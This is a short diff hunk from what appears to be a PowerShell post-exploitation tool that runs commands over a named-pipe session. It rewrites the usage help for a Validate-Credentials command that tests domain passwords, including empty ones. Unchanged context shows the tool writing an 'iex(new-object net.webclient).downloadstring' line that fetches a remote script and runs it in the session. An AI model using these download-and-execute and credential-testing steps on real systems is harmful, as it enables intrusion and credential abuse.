@@ -1691,11 +1691,9 @@ function InteractWithPipeSession{
 			Write-Output ""
 			Write-Output "[+] Usage:"
 			Write-Output ""
-			Write-Output "    Validate-Credentials -UserName ferrari\Senna                                Test an empty password"
+			Write-Output "    Validate-Credentials -UserName Senna -Password FuerteCorre1 -Domain ferrari.local   Test Credentials"
 			Write-Output ""
-			Write-Output "    Validate-Credentials -UserName ferrari\Senna -Password FuerteCorre1         Test Credentials"
-			Write-Output ""
-			Write-Output "    Validate-Credentials -UserName ferrari\Senna -Password FuerteCorre1 -Domain ferrari.local -DomainController DC01.ferrari.local"
+			Write-Output "    Validate-Credentials -UserName Senna -Domain ferrari.local                          Test Empty Password"
 			
 			$sw.WriteLine("iex(new-object net.webclient).downloadstring('$($global:ServerURL)/Validate-Credentials.ps1')")
 			$sw.Flush()
